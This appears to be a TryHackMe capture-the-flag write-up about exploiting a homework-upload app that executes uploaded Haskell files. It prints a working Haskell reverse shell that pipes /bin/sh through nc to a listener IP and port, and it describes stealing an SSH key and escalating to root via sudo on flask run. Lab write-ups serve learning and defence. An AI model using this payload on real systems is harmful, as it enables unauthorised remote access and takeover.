This TryHackMe room had a haskell vulnerability in it where it executed any haskell file that was uploaded to it. Through some directory fuzzing I was able to find an uploads page which allowed me to upload a haskell reverse shell and gain a shell as the flask user. Through enumerating the "prof" users home directory I obtained their ssh-key gaining persistent access on the target with new permission to run flask apps without a password. Writing a malicious python app to run OS commands and utilizing these new permissions allows full administrative control over the target.

![[Screenshot 2026-08-01 at 11.11.13 PM.png]]
running an initial port scan on the target, i was able to find an app running on port 5001.![[Screenshot 2026-08-01 at 11.15.04 PM.png]]![[Screenshot 2026-08-01 at 11.15.47 PM.png]]
The site is for a homework submission tool written by a professor who is having the homework checked automatically. To ensure the application does not receive just any file it is configured to only allow haskell files. When you click the "here" link to upload the homework it takes you straight to the uploads directory and since there is nothing there you get a page not found error.


![[Screenshot 2026-08-01 at 11.20.46 PM.png]]
Running feroxbuster i was able to quickly fuzz the target and find the page to upload haskell files at "/submit".
![[Screenshot 2026-08-01 at 11.25.59 PM.png]]
```
import System.Process

import System.IO

import Control.Concurrent (threadDelay)

  

main :: IO ()

main = do

    let targetIp   = "192.168.137.253"

        targetPort = "4444"

    let commandString = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc " 

                        ++ targetIp ++ " " ++ targetPort ++ " > /tmp/f"

    -- Spawn the process without blocking the main execution thread

    (_, _, _, _) <- createProcess (shell commandString)

        { std_in  = NoStream   -- Detach standard input from the web server

        , std_out = NoStream   -- Detach standard output

        , std_err = NoStream   -- Detach standard error

        }

    -- Give the system a brief moment to initialize the pipeline

    threadDelay 500000 

    -- Exit cleanly so the web server receives a '200 OK' success status

    -- This keeps the web server from forcefully killing the background thread

    putStrLn "Status: 200 OK"

    putStrLn "Content-Type: text/plain"

    putStrLn ""

    putStrLn "Initialization complete."
```

Using this script i was able to get a stable shell on the target and enumerate through the directories to get the first flag.
![[Screenshot 2026-08-01 at 11.32.12 PM.png]]

![[Screenshot 2026-08-01 at 11.33.22 PM.png]]
After getting the user flag you can find the private key to the prof user.

![[Screenshot 2026-08-01 at 11.35.12 PM.png]]
We can ssh into the target and get a persistent interactive shell with elevated privileges. 

![[Screenshot 2026-08-01 at 11.38.23 PM.png]]
We have sudo permissions to run flask run is we check with sudo -l. 


![[Screenshot 2026-08-01 at 11.39.41 PM.png]]
So since we have sudo permissions to run flask applications without a password we are able to create a malicious application with the ability to run OS commands. Once we call the app to our path and execute flask run with sudo permissions, we get a shell as root. 




![[Screenshot 2026-08-01 at 11.41.46 PM.png]]
Happy hacking :p